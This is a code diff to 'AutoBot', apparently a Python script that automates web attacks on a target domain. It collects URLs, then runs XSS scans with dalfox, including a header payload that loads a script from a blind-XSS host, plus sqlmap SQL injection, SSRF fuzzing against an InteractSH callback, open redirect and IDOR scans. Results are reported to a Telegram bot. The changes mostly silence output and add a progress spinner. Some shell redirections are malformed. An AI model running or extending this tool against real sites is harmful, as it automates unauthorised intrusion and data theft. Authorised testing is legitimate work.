@@ -4,6 +4,7 @@ from libs.telegramText import NotifyBot, SendDocumentBot, CheckTokens, GetTokens
 import libs.coloredOP as co
 from pathlib import Path
 from zipfile import ZipFile
+from halo import Halo
 import threading 
 import os
 import datetime
@@ -21,7 +22,7 @@ TELEGRAM_KEYS = {}
 
 def executeCommand(COMMAND, verbose=False):
     try:
-        subprocess.run(COMMAND, shell=True, check=True, text=True)
+        subprocess.run(COMMAND, shell=True, check=True, text=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
         if verbose:
             print("\t"+co.bullets.OK, co.colors.GREEN+"Command Executed Successfully."+co.END)
     except subprocess.CalledProcessError as e:
@@ -45,22 +46,21 @@ def CompressFile(FName, Files):
 def CollectURLS(Domain):
     # collecting urls using waybackurls 
     COMMAND = 'echo {} | waybackurls | egrep -v ".css|.png|.jpeg|.jpg|.svg|.gif|.ttf|.woff|.woff2|.eot|.otf|.ico|.js" >> temp_urls.txt'.format(Domain)
-    print(co.bullets.CProcess, co.colors.GREEN+"Collecting urls with waybackurls"+co.END)
     executeCommand(COMMAND)
     ## Collecting urls from gau
     COMMAND = 'gau -b css,png,jpeg,jpg,svg,gif,ttf,woff,woff2,eot,otf,ico,js {} | anew -q temp_urls.txt'.format(Domain)
-    print(co.bullets.CProcess, co.colors.GREEN+"Collecting urls with gau"+co.END) 
     executeCommand(COMMAND)
     # use qsreplace to remove duplicates 
-    COMMAND = 'cat temp_urls.txt | sed -e "s/=.*/=/" -e "s/URL: //" | qsreplace -a >> urls.txt'
+    COMMAND = 'cat temp_urls.txt | sed -e "s/=.*/=/" -e "s/URL: //" | qsreplace -a >> urls.txt 2>&1 /dev/null'
     executeCommand(COMMAND)
     # deleting extra file 
     os.remove("temp_urls.txt")
     # count number of lines 
     numOfLines = open("urls.txt", "r").read().count("\n")-1
     global TELEGRAMTokens
+    global TELEGRAM_KEYS
     if TELEGRAMTokens:
-        NotifyBot("🥷 AutoBot : {} URLs collected for {}".format(numOfLines, Domain))
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : {} URLs collected for {}".format(numOfLines, Domain))
 
 def XSSAttack(Domain, BlindXSS=None):
     global TELEGRAMTokens
@@ -71,14 +71,14 @@ def XSSAttack(Domain, BlindXSS=None):
     executeCommand(COMMAND)
     if BlindXSS:
         # checking xss using dalfox including blind xss
-        COMMAND = 'dalfox file xss_urls.txt -b {} -o xss_dalfox.txt -H \"referrer: xxx\'><script src=//{}></script>\"'.format(BlindXSS, BlindXSS)
+        COMMAND = 'dalfox file xss_urls.txt -b {} -o xss_dalfox.txt -H \"referrer: xxx\'><script src=//{}></script>\" 2>&1 /dev/null'.format(BlindXSS, BlindXSS)
         executeCommand(COMMAND)
     else:
         # checking xss using dalfox for stored and reflected xss
-        COMMAND = 'dalfox file xss_urls.txt -o xss_dalfox.txt'
+        COMMAND = 'dalfox file xss_urls.txt -o xss_dalfox.txt 2>&1 /dev/null'
         executeCommand(COMMAND)
     # checking with kxss
-    COMMAND = 'cat xss_urls.txt | kxss >> xss_kxss.txt'
+    COMMAND = 'cat xss_urls.txt | kxss >> xss_kxss.txt 2>&1 /dev/null'
     executeCommand(COMMAND)
     # compress files 
     FName = "{}_xss.zip".format(Domain)
@@ -112,9 +112,9 @@ def SQLInjection(Domain):
     global TELEGRAM_KEYS
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Started on target {}".format(Domain))
-    executeCommand('cat urls.txt | gf sqli | httpx -mc 200,201,202,300,301,302 -silent >> sqli_urls.txt')
+    executeCommand('cat urls.txt | gf sqli | httpx -mc 200,201,202,300,301,302 -silent >> sqli_urls.txt 2>&1 /dev/null')
     # perform sql injection attack on target 
-    executeCommand('sqlmap -m sqli_urls.txt --batch --random-agent --level 1 | tee sqli_result.txt')
+    executeCommand('sqlmap -m sqli_urls.txt --batch --random-agent --level 1 >> sqli_result.txt 2>&1 /dev/null')
     # compress files 
     FName = "{}_sqli.zip".format(Domain)
     if os.path.isfile("sqli_result.txt"):
@@ -138,9 +138,9 @@ def SSRFScan(Domain, InteractSH):
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SSRF Scan Started on target {}".format(Domain))
     executeCommand('cat urls.txt | gf ssrf | httpx -mc 200,201,202,300,301,302 -silent >> ssrf_urls.txt')
-    COMMAND = 'cat ssrf_urls.txt | qsreplace "{}" >> ssrf_paylod_urls.txt'.format(InteractSH)
+    COMMAND = 'cat ssrf_urls.txt | qsreplace "{}" >> ssrf_paylod_urls.txt 2>&1 /dev/null'.format(InteractSH)
     executeCommand(COMMAND)
-    executeCommand('ffuf -c -w ssrf_paylod_urls.txt -u FUZZ -o ssrf_fuzz_result.txt')
+    executeCommand('ffuf -c -w ssrf_paylod_urls.txt -u FUZZ -o ssrf_fuzz_result.txt 2>&1 /dev/null')
     # cleaning extra files
     os.remove("ssrf_urls.txt")
     if TELEGRAMTokens:
@@ -209,7 +209,7 @@ def Banner():
 
 def printInfo(Domain, OPDir):
     print(co.bullets.INFO, co.colors.CYAN+"Target Domain : {}".format(Domain)+co.END)
-    print(co.bullets.INFO, co.colors.CYAN+"Result Dir    : {}\n".format(OPDir)+co.END)
+    print(co.bullets.INFO, co.colors.CYAN+"Result Dir    : {}".format(OPDir)+co.END)
 
 class MyParser(argparse.ArgumentParser):
     def error(self, message):
@@ -220,10 +220,10 @@ class MyParser(argparse.ArgumentParser):
 
 def main():
     parser = MyParser()
-    parser.add_argument("-d", "--domain", help="Domain name to perform Attack", type=str)
+    parser.add_argument("-d", "--domain", help="Domain name to perform Attack", type=str, required=True)
     parser.add_argument("-o", "--out", help="Output directory name", type=str)
     parser.add_argument("-b", "--blind", help="XSS hunter URL for Blind XSS inection Testing", type=str, default=None)
-    parser.add_argument("-i", "--interactSH", help="InteractSH URL for Catching SSRF", type=str)
+    parser.add_argument("-i", "--interactSH", help="InteractSH URL for Catching SSRF", type=str, required=True)
     args = parser.parse_args()
     # Check argument
     if args.domain is None and args.interactSH is None:
@@ -235,10 +235,10 @@ def main():
     tDomain = "" # raw domain name
     OPDir = ""   # Output Directory 
     # validae url
-    if(ValideteDomain(args.url)):
-        tDomain = args.url 
+    if(ValideteDomain(args.domain)):
+        tDomain = args.domain 
     else:
-        print(co.bullets.ERROR, co.colors.BRED+"Invalid Domain:{}".format(args.url)+co.END)
+        print(co.bullets.ERROR, co.colors.BRED+" Invalid Domain:{}".format(args.url)+co.END)
         sys.exit()
     # get the http protocol 
     try:
@@ -259,14 +259,15 @@ def main():
     global TELEGRAM_KEYS
     retVal = CheckTokens(CONFIGPath)
     if retVal == 1:
+        print(co.bullets.DONE+co.colors.GREEN+" Telegram API Keys found."+co.END)
         TELEGRAMTokens = True
         apiToken, chatID = GetTokens(CONFIGPath)
         TELEGRAM_KEYS['apiToken'] = apiToken
         TELEGRAM_KEYS['chatID'] = chatID
     elif retVal == 2:
-        print(co.bullets.ERROR+co.colors.RED+"Telegram Bot keys not found.!1"+co.END)
+        print(co.bullets.ERROR+co.colors.RED+" Telegram Bot keys not found.!1"+co.END)
     elif retVal == 3:
-        print(co.bullets.ERROR+co.colors.RED+"Telegram Bot Config File not found.!1"+co.END)
+        print(co.bullets.ERROR+co.colors.RED+" Telegram Bot Config File not found.!1"+co.END)
     # Sending telegram message
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Automated attcker staretd for domain : {}".format(tDomain))
@@ -292,45 +293,67 @@ def main():
     #################
     # Change directory
     os.chdir(OPDir)
+    # Setting-up the spinner 
+    spinner = Halo(text=' 🤖 Work in Progress..', spinner='dots')
+    spinner.start()
     ## Collecting urls gg
-    print(co.bullets.INFO+co.colors.CYAN+"Collecting URLs.."+co.END)
     CollectURLS(tDomain)
-    print(co.bullets.INFO+co.colors.CYAN+"URLs collected.."+co.END)
+    spinner.stop()
+    print(co.bullets.DONE+co.colors.GREEN+" URLs Collected.."+co.END)
+    spinner.start()
     ## strat XSS scan 
     t1 = threading.Thread(target=XSSAttack, args=(tDomain, args.blind,))
     t1.start()
-    print(co.bullets.INFO+co.colors.CYAN+"XSS Scan Started.."+co.END)
-    t1.join()
+    spinner.stop()
+    print(co.bullets.INFO+co.colors.CYAN+" XSS Scan Started.."+co.END)
+    spinner.start()
     ## start SQLi scan 
     t2 = threading.Thread(target=SQLInjection, args=(tDomain,))
     t2.start()
-    print(co.bullets.INFO+co.colors.CYAN+"SQLi Scan Started.."+co.END)
-    t2.join()
+    spinner.stop()
+    print(co.bullets.INFO+co.colors.CYAN+" SQLi Scan Started.."+co.END)
+    spinner.start()
     ## start SSRF Scan 
-    t3 = threading.Thread(target=SSRFScan, args=(tDomain,args.InteractSH,))
+    t3 = threading.Thread(target=SSRFScan, args=(tDomain,args.interactSH,))
     t3.start()
-    print(co.bullets.INFO+co.colors.CYAN+"SSRF Scan Started.."+co.END)
-    t3.join()
+    spinner.stop()
+    print(co.bullets.INFO+co.colors.CYAN+" SSRF Scan Started.."+co.END)
+    spinner.start()
     ## Open redirect scan 
     t4 = threading.Thread(target=OpenRedirect, args=(tDomain,))
     t4.start()
-    print(co.bullets.INFO+co.colors.CYAN+"Open Redirect Scan Started.."+co.END)
-    t4.join()
+    spinner.stop()
+    print(co.bullets.INFO+co.colors.CYAN+" Open Redirect Scan Started.."+co.END)
+    spinner.start()
     # IDOR Scan 
     t5 = threading.Thread(target=IDORScan, args=(tDomain,))
     t5.start()
-    print(co.bullets.INFO+co.colors.CYAN+"IDOR Scan Started.."+co.END)
+    spinner.stop()
+    print(co.bullets.INFO+co.colors.CYAN+" IDOR Scan Started.."+co.END)
+    spinner.start()
+    t1.join() 
+    t2.join() 
+    t3.join() 
+    t4.join() 
     t5.join() 
-    print(co.bullets.DONE+co.colors.GREEN+"All Scan Completed"+co.END)
+    spinner.stop()
+    print(co.bullets.INFO+co.colors.CYAN+" IDOR Scan Started.."+co.END)
+    print(co.bullets.DONE+co.colors.GREEN+" All Scan Completed"+co.END)
+    spinner.start()
     os.chdir("..")
     files = os.listdir(OPDir)        
     try:
         CompressFile("{}_autobot.zip".format(OPDir), files)
-        print(co.bullets.DONE+co.colors.GREEN+"Resultfile : {}_autobot.zip".format(OPDir)+co.END)
+        spinner.stop()
+        print(co.bullets.DONE+co.colors.GREEN+" Resultfile : {}_autobot.zip".format(OPDir)+co.END)
+        spinner.start()
         shutil.rmtree(OPDir)
     except:
-        print(co.bullets.DONE+co.colors.GREEN+"Resultfile : {}".format(OPDir)+co.END)
-    print(co.bullets.DONE+co.colors.GREEN+"AutoBot Scan Completed."+co.END)
+        spinner.stop()
+        print(co.bullets.DONE+co.colors.GREEN+" Resultfile : {}".format(OPDir)+co.END)
+        spinner.start()
+    spinner.stop()
+    print(co.bullets.DONE+co.colors.GREEN+" AutoBot Scan Completed."+co.END)
 
 if __name__ == "__main__":
     main()
